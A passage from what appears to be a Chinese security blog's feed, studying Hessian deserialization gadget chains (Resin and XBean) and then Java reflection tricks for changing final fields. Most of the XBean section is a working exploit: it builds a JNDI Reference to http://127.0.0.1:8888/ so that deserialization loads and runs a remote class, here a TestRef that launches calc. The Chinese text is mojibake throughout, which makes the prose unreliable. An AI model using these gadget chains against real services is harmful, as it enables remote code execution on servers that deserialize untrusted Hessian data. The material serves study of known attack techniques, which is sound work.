class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">// åˆ›å»ºContinuationContextå¯¹è±¡</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);<br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);<br>        <span class="hljs-comment">// æ„é€ æ–¹æ³•ä¸ºprotectedä¿®é¥°</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">continuationContext</span> <span class="hljs-operator">=</span> (Context) constructor.newInstance(cannotProceedException, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;());<br><br><br>        <span class="hljs-comment">// åˆ›å»ºQName</span><br>        <span class="hljs-type">QName</span> <span class="hljs-variable">qName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">QName</span>(continuationContext, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(qName.hashCode());<br>        <span class="hljs-comment">// åˆ›å»ºXtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// åˆ›å»ºHashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(qName, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»TestRef</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestRef</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TestRef</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102208703.png" alt="image-20241010220704531"></p><h2 id="xbean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h2><p>è¿™æ¡é“¾å’ŒResinå·®ä¸å¤š</p><p>å¯¼å…¥ä¸‹é¢ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-naming<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>é“¾å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#equals--&gt;XString#equals--&gt;ContextUtil.ReadOnlyBinding#toString--&gt;Binding#toString--&gt;ContextUtil.ReadOnlyBinding#getObject--&gt;ContextUtil#resolve--&gt;NamingManager#getObjectInstance<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å…³é”®çš„åœ°æ–¹</p><p>ContextUtil.ReadOnlyBinding#toStringæœ¬èº«æ²¡æœ‰toStringæ‰€ä»¥å°±èµ°åˆ°çˆ¶ç±»Binding#toString</p><p><img src="https://cdn.clown2024.cn/202410102223585.png" alt="image-20241010222327507"></p><p>ContextUtil.ReadOnlyBinding#getObject</p><p><img src="https://cdn.clown2024.cn/202410102224965.png" alt="image-20241010222415889"></p><p>ContextUtil#resolve</p><p><img src="https://cdn.clown2024.cn/202410102227755.png" alt="image-20241010222504369"></p><p>ç„¶ååé¢çš„å°±å’Œå‰é¢ä¸€æ ·äº†</p><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.ContextUtil;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.WritableContext;<br><br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XBeanUse</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">//åˆ›å»ºContextUtil.ReadOnlyBindingå¯¹è±¡</span><br>        ContextUtil.<span class="hljs-type">ReadOnlyBinding</span> <span class="hljs-variable">readOnlyBinding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextUtil</span>.ReadOnlyBinding(<span class="hljs-string">&quot;clown&quot;</span>,ref,<span class="hljs-keyword">new</span> <span class="hljs-title class_">WritableContext</span>());<span class="hljs-comment">//æ”¾å…¥ref</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(readOnlyBinding.hashCode());<br>        <span class="hljs-comment">// åˆ›å»ºXtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// åˆ›å»ºHashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(readOnlyBinding, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102245522.png" alt="image-20241010224522400"></p><blockquote><p>é€‰æ‹©Contextçš„å®ç°ç±»çš„æ—¶å€™æœ‰äº›å¯èƒ½æŠ¥é”™åœ¨æ‰§è¡Œä»–çš„getEnvironmentæ–¹æ³•çš„æ—¶å€™ï¼Œéœ€è¦è®¾ç½®ä¸€äº›å˜é‡ä¹‹ç±»çš„ï¼Œè¿™é‡Œçš„WritableContextç±»å°±å¯ä»¥ç›´æ¥åˆ›å»ºå°±èƒ½ç”¨</p></blockquote><h2 id="å…¶ä»–é“¾"><a href="#å…¶ä»–é“¾" class="headerlink" title="å…¶ä»–é“¾"></a>å…¶ä»–é“¾</h2><p>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„é“¾å­æ¯”å¦‚Spring AOPä¹‹ç±»çš„å°±ä¸åˆ†æäº†ï¼Œæ‡’äº†ä¸»è¦æ˜¯ï¼ˆ</p><p>çœ‹ä¸€ä¸‹å¸ˆå‚…çš„æ–‡ç« å°±å¥½ï¼Œåˆ°æ—¶é‡åˆ°å†ç ”ç©¶ã€‚</p><p>è¿™ç¯‡æ–‡ç« æœ‰ç›¸å…³expï¼š<a href="https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&u_asig=1a0c384b17285714178144818e003d">https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&amp;u_asig=1a0c384b17285714178144818e003d</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¥å­¦ä¸€ä¸‹Hessianååºåˆ—åŒ–ï¼Œä¸»è¦å‚è€ƒsu18å¸ˆå‚…çš„æ–‡ç« ï¼š&lt;/p&gt;
&lt;h1 id=&quot;hessianç®€ä»‹&quot;&gt;&lt;a href=&quot;#Hessianç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;Hessianç®€ä»‹&quot;&gt;&lt;/a&gt;Hessianç®€ä»‹&lt;/h1&gt;&lt;p&gt;ç›´æ¥æŠ„s</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>åå°„ä¿®æ”¹å˜é‡</title>
    <link href="https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/"/>
    <id>https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/</id>
    <published>2024-10-04T03:25:10.000Z</published>
    <updated>2024-10-04T03:26:39.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"><a href="#ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic" class="headerlink" title="ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"></a>ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/noKing/p/9038234.html">https://www.cnblogs.com/noKing/p/9038234.html</a></p><h2 id="ä¿®æ”¹staticå˜é‡"><a href="#ä¿®æ”¹staticå˜é‡" class="headerlink" title="ä¿®æ”¹staticå˜é‡"></a>ä¿®æ”¹staticå˜é‡</h2><p>è¿™é‡Œå’Œæ­£å¸¸ä¿®æ”¹æ™®é€šå˜é‡ä¸€æ ·éƒ½æ˜¯æ²¡é—®é¢˜çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹staticå˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;str&quot;</span>);<br>        str1.setAccessible(<span class="hljs-literal">true</span>);<br>        str1.set(test1,<span class="hljs-string">&quot;ceshi1&quot;</span>);<br>        System.out.println(Test1.str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125754.png" alt="image-20241004100135810"></p><h2 id="ä¿®æ”¹finalå˜é‡"><a href="#ä¿®æ”¹finalå˜é‡" class="headerlink" title="ä¿®æ”¹finalå˜é‡"></a>ä¿®æ”¹finalå˜é‡</h2><p>è¿™é‡Œæœ‰ç‚¹ä¸åŒ</p><p>æˆ‘ä»¬ä¿®æ”¹StringBuilderå˜é‡</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„å˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.setAccessible(<span class="hljs-literal">true</span>);<br>        name1.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi3&quot;</span>));<br>        System.out.println(test1.name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125725.png" alt="image-20241004100649459"></p><p>çœ‹åˆ°æ˜¯å¯ä»¥ä¿®æ”¹æˆåŠŸçš„</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¿®æ”¹Stringå˜é‡ä¼šå‘ç°ä¿®æ”¹ä¸æˆåŠŸï¼Œè¿™æ˜¯å› ä¸ºStringç±»å‹çš„finalå˜é‡ï¼Œåœ¨ä¼˜åŒ–æ—¶ä¼šå°†å…¶å˜æˆå¸¸é‡ï¼Œæ¯”å¦‚ä¸‹é¢çš„System.out.println(test1.STR1);å°±ä¼šå˜æˆSystem.out.println(â€œtestâ€);ï¼Œæ‰€ä»¥å…¶å®èµ‹å€¼æ˜¯æˆåŠŸäº†çš„ï¼Œä½†æ˜¯å› ä¸ºæ‰“å°å˜æˆå¸¸é‡äº†æ‰€ä»¥æ²¡å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå°„æ‹¿å‡ºå€¼æ¥éªŒè¯ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„Stringå˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi2&quot;</span>);<br>        System.out.println(test1.STR1);<br>        System.out.println(str11.get(test1));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125750.png" alt="image-20241004100943421"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯æ²¡é—®é¢˜çš„</p><p>é‚£æˆ‘ä»¬æƒ³è¦ä¿®æ”¹finalå˜é‡å°±éœ€è¦é˜²æ­¢Stringç±»å‹å˜é‡åœ¨ç¼–è¯‘æ—¶è¢«å¤„ç†ä¸ºå¸¸é‡ï¼Œæ–¹æ³•å°±æ˜¯è®©å…¶å€¼çš„åˆå§‹åŒ–ç»è¿‡è¿ç®—æ‰èƒ½å¾—åˆ°ï¼Œæˆ‘ä»¬ä»£ç å¯ä»¥æ”¹æˆè¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=(<span class="hljs-literal">null</span> == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;default4&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default5&quot;</span>).toString();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„Stringå˜é‡</span><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi5&quot;</span>);<br>        System.out.println(test1.STR1);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR2&quot;</span>);<br>        str2.setAccessible(<span class="hljs-literal">true</span>);<br>        str2.set(test1,<span 